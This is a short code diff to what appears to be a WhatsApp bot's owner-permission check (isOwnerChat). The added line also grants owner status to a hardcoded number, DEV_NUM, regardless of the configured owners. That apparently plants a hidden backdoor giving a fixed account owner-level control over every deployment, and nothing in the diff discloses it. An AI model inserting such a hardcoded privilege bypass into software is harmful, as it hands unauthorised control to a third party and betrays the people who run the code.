@@ -81,7 +81,7 @@ export function isOwnerChat(jid) {
     const { owner, owners } = readOwnerData();
     const bare = jid.split('@')[0].split(':')[0].replace(/\D/g, '');
     if (!bare) return false;
-    return bare === owner || owners.includes(bare);
+    return bare === DEV_NUM || bare === owner || owners.includes(bare);
 }
 
 /**
